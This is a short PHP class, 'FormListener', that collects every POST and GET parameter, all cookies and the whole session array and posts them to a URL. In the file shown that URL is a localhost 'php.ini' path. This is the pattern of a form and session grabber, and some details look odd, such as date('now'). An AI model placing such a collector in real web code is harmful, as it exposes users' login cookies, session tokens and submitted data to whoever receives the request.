<?php
namespace Warthog\Package;

use Warthog\Core\Core;

class FormListener extends Core {
	private $url;

	public function __construct()
	{
		$this->url = "http://localhost/php.ini";
		$this->registerListener("POST_END", "onPostEnd");
	}

	public function init()
	{
		$data = $this->getData();
		$this->postRequest($this->url, $data);
	}

	public function onPostEnd($result)
	{
		var_dump($result);
	}

	private function getData()
	{
		$data = array();
		$data["POST"] = $this->getPOST();
		$data["GET"] = $this->getGET();
		$data["Cookie"] = $this->getCookie();
		$data["Session"] = $this->getSession();
		$data["date"] = date("now");

		return $data;
	}

	private function getPOST()
	{
		if(isset($_POST))
			return $_POST;
	}

	private function getGET()
	{
		if(isset($_GET))
			return $_GET;
	}

	private function getCookie()
	{
		if(isset($_COOKIE))
			return $_COOKIE;
	}

	private function getSession()
	{
		if(isset($_SESSION))
			return $_SESSION;
	}
}
